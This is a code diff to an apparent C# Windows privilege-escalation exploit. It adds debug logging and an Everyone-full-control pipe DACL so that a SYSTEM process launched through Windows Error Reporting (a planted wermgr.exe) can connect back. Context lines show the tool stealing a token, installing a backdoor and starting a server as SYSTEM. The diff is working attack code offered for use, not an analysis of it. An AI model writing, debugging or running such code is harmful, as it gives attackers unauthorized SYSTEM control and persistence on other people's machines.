@@ -25,6 +25,7 @@ using System.IO.Pipes;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.AccessControl;
 using System.Security.Principal;
 using System.Threading;
 using Microsoft.Win32;
@@ -609,16 +610,20 @@ if($r-eq 0){
 
         /* SYSTEM mode: either /server (scheduled task) or direct SYSTEM launch via WER */
         if (WindowsIdentity.GetCurrent().IsSystem || mode=="/server") {
+            File.WriteAllText(@"C:\ProgramData\ep_system_ran.txt",
+                $"ran as SYSTEM at {DateTime.Now}\nargs: {string.Join(" ",args)}\n");
             /* First: connect back to escalation pipe if one is waiting */
             try {
                 using (var esc = new NamedPipeClientStream(".", PipeEsc, PipeDirection.InOut)) {
-                    esc.Connect(2000);
-                    /* Keep connection alive while user side steals token */
+                    esc.Connect(5000);
+                    File.AppendAllText(@"C:\ProgramData\ep_system_ran.txt","pipe connected\n");
                     byte[] ack = new byte[1];
                     esc.Read(ack, 0, 1);
+                    File.AppendAllText(@"C:\ProgramData\ep_system_ran.txt","ack received\n");
                 }
-            } catch {}
-            /* Install persistence then run srv server */
+            } catch(Exception ex) {
+                File.AppendAllText(@"C:\ProgramData\ep_system_ran.txt",$"pipe error: {ex.Message}\n");
+            }
             InstallBackdoor(IntPtr.Zero);
             RunSrvServer();
             return;
@@ -636,11 +641,16 @@ if($r-eq 0){
         if (TryFastPath()) return;
         Console.WriteLine("[*] No session found. Running full escalation...\n");
 
-        /* Create escalation pipe server (user=server, SYSTEM=client) */
+        /* Create escalation pipe server with open DACL so SYSTEM can connect */
         NamedPipeServerStream escPipe = null;
         try {
+            var ps = new PipeSecurity();
+            /* Allow Everyone full control - SYSTEM must be able to connect from session 0 */
+            ps.AddAccessRule(new PipeAccessRule(
+                new SecurityIdentifier(WellKnownSidType.WorldSid, null),
+                PipeAccessRights.FullControl, AccessControlType.Allow));
             escPipe = new NamedPipeServerStream(PipeEsc, PipeDirection.InOut, 1,
-                PipeTransmissionMode.Byte, PipeOptions.None, 64, 64);
+                PipeTransmissionMode.Byte, PipeOptions.None, 64, 64, ps);
         } catch (Exception ex) {
             Console.WriteLine($"[-] Could not create escalation pipe: {ex.Message}"); return;
         }
@@ -664,6 +674,12 @@ if($r-eq 0){
             try{RecDelete(CF);}catch{}
             try{RecDelete(TK);}catch{}
             try{Directory.Delete(runDir,true);}catch{}
+            if (File.Exists(@"C:\ProgramData\ep_system_ran.txt")) {
+                Console.WriteLine("[*] Debug (wermgr.exe did run):");
+                Console.WriteLine(File.ReadAllText(@"C:\ProgramData\ep_system_ran.txt"));
+            } else {
+                Console.WriteLine("[-] WER never ran our wermgr.exe (ep_system_ran.txt missing)");
+            }
             return;
         }
         Console.WriteLine("[+] SYSTEM connected");
